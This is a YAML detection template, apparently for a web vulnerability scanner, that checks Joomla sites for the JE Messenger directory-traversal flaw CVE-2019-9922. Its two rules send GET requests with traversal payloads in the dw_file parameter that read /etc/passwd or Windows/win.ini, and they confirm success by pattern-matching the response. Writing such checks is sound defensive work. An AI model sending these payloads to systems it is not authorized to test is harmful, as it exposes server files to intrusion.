name: yaml-poc-harmistechnology-je_messenger-directory_traversal-CVE-2019-9922
binding: bef0c7d4-c4c1-476a-833b-9999e1b731ed
detail:
    author: system_user
    links:
        - https://extensions.joomla.org/extension/je-messenger/
        - https://github.com/azd-cert/CVE/blob/master/CVEs/CVE-2019-9922.md
        - https://nvd.nist.gov/vuln/detail/CVE-2019-9922
    vulnerability:
        id: b2811af5-d9d7-4b56-af33-45e6b0979eb6
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../Windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: r0() || r1()
